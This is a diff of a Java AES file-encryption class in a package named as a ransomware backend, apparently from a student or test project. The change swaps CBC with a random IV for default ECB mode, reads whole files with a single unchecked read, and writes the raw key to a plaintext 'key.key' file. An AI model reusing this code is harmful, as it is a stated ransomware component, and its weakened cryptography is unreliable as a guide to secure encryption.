@@ -1,98 +1,90 @@
 package com.jdrll.test1.ransomewareBackend;
 
-import javax.crypto.Cipher;
-import javax.crypto.KeyGenerator;
-import javax.crypto.SecretKey;
-import javax.crypto.spec.IvParameterSpec;
+import javax.crypto.*;
 import javax.crypto.spec.SecretKeySpec;
-import java.io.File;
-import java.io.FileInputStream;
-import java.io.FileOutputStream;
-import java.security.Key;
-import java.security.SecureRandom;
+import java.io.*;
+import java.nio.file.Files;
+import java.nio.file.Paths;
+import java.security.InvalidKeyException;
+import java.security.NoSuchAlgorithmException;
+import java.util.Base64;
 
 public class Cifrado {
-    private SecretKey secretKey;
+    private static final String ALGORITHM = "AES";
+    private static final String TRANSFORMATION = "AES";
 
-    public Cifrado() throws Exception {
-        this.secretKey = generateKey();
-    }
-
-    private SecretKey generateKey() throws Exception {
-        KeyGenerator keyGen = KeyGenerator.getInstance("AES");
-        keyGen.init(128);
-        return keyGen.generateKey();
-    }
-
-    public void cifrarArchivo(Archivo archivo, File archivoCifrado) throws Exception {
-        doCrypto(Cipher.ENCRYPT_MODE, archivo.getArchivo(), archivoCifrado);
-    }
-
-    public void descifrarArchivo(Archivo archivo, File archivoDescifrado) throws Exception {
-        doCrypto(Cipher.DECRYPT_MODE, archivo.getArchivo(), archivoDescifrado);
-    }
-
-    private void doCrypto(int cipherMode, File inputFile, File outputFile) throws Exception {
-        Key secretKeySpec = new SecretKeySpec(secretKey.getEncoded(), "AES");
-        Cipher cipher = Cipher.getInstance("AES/CBC/PKCS5Padding");
-
-        FileInputStream inputStream = new FileInputStream(inputFile);
-        FileOutputStream outputStream = new FileOutputStream(outputFile);
-
+    public static void encrypt(File inputFile, File outputFile) throws CryptoException {
         try {
-            if (cipherMode == Cipher.ENCRYPT_MODE) {
-                byte[] iv = new byte[cipher.getBlockSize()];
-                SecureRandom random = new SecureRandom();
-                random.nextBytes(iv);
-                IvParameterSpec ivSpec = new IvParameterSpec(iv);
+            // Generar una clave AES aleatoria
+            SecretKey secretKey = generateAESKey();
 
-                cipher.init(Cipher.ENCRYPT_MODE, secretKeySpec, ivSpec);
-                outputStream.write(iv); // Write IV to output file
+            // Guardar la clave generada para usarla en el descifrado
+            saveKey(secretKey, new File("key.key"));
 
-                byte[] inputBytes = new byte[1024];
-                int bytesRead;
-                while ((bytesRead = inputStream.read(inputBytes)) != -1) {
-                    byte[] outputBytes = cipher.update(inputBytes, 0, bytesRead);
-                    if (outputBytes != null) {
-                        outputStream.write(outputBytes);
-                    }
-                }
-                byte[] outputBytes = cipher.doFinal();
-                if (outputBytes != null) {
-                    outputStream.write(outputBytes);
-                }
+            Cipher cipher = Cipher.getInstance(TRANSFORMATION);
+            cipher.init(Cipher.ENCRYPT_MODE, secretKey);
 
-            } else if (cipherMode == Cipher.DECRYPT_MODE) {
-                byte[] iv = new byte[cipher.getBlockSize()];
-                inputStream.read(iv); // Read IV from input file
-                IvParameterSpec ivSpec = new IvParameterSpec(iv);
+            try (FileInputStream inputStream = new FileInputStream(inputFile);
+                 FileOutputStream outputStream = new FileOutputStream(outputFile)) {
 
-                cipher.init(Cipher.DECRYPT_MODE, secretKeySpec, ivSpec);
+                byte[] inputBytes = new byte[(int) inputFile.length()];
+                inputStream.read(inputBytes);
 
-                byte[] inputBytes = new byte[1024];
-                int bytesRead;
-                while ((bytesRead = inputStream.read(inputBytes)) != -1) {
-                    byte[] outputBytes = cipher.update(inputBytes, 0, bytesRead);
-                    if (outputBytes != null) {
-                        outputStream.write(outputBytes);
-                    }
-                }
-                byte[] outputBytes = cipher.doFinal();
-                if (outputBytes != null) {
-                    outputStream.write(outputBytes);
-                }
+                byte[] outputBytes = cipher.doFinal(inputBytes);
+
+                outputStream.write(outputBytes);
             }
-        } finally {
-            inputStream.close();
-            outputStream.close();
+
+        } catch (NoSuchPaddingException | NoSuchAlgorithmException | InvalidKeyException | BadPaddingException | IllegalBlockSizeException | IOException ex) {
+            throw new CryptoException("Error encrypting file", ex);
         }
     }
 
-    public SecretKey getSecretKey() {
-        return secretKey;
+    public static void decrypt(File inputFile, File outputFile) throws CryptoException {
+        try {
+            // Cargar la clave AES desde el archivo guardado
+            SecretKey secretKey = loadKey(new File("key.key"));
+
+            Cipher cipher = Cipher.getInstance(TRANSFORMATION);
+            cipher.init(Cipher.DECRYPT_MODE, secretKey);
+
+            try (FileInputStream inputStream = new FileInputStream(inputFile);
+                 FileOutputStream outputStream = new FileOutputStream(outputFile)) {
+
+                byte[] inputBytes = new byte[(int) inputFile.length()];
+                inputStream.read(inputBytes);
+
+                byte[] outputBytes = cipher.doFinal(inputBytes);
+
+                outputStream.write(outputBytes);
+            }
+
+        } catch (NoSuchPaddingException | NoSuchAlgorithmException | InvalidKeyException | BadPaddingException | IllegalBlockSizeException | IOException ex) {
+            throw new CryptoException("Error decrypting file", ex);
+        }
     }
 
-    public void setSecretKey(SecretKey secretKey) {
-        this.secretKey = secretKey;
+    private static SecretKey generateAESKey() throws NoSuchAlgorithmException {
+        KeyGenerator keyGenerator = KeyGenerator.getInstance(ALGORITHM);
+        keyGenerator.init(128); // Tamaño de clave AES 128 bits
+        return keyGenerator.generateKey();
+    }
+
+    private static void saveKey(SecretKey key, File keyFile) throws IOException {
+        byte[] encodedKey = key.getEncoded();
+        FileOutputStream fos = new FileOutputStream(keyFile);
+        fos.write(encodedKey);
+        fos.close();
+    }
+
+    private static SecretKey loadKey(File keyFile) throws IOException {
+        byte[] encodedKey = Files.readAllBytes(Paths.get(keyFile.getAbsolutePath()));
+        return new SecretKeySpec(encodedKey, ALGORITHM);
+    }
+
+    public static class CryptoException extends Exception {
+        public CryptoException(String message, Throwable throwable) {
+            super(message, throwable);
+        }
     }
 }
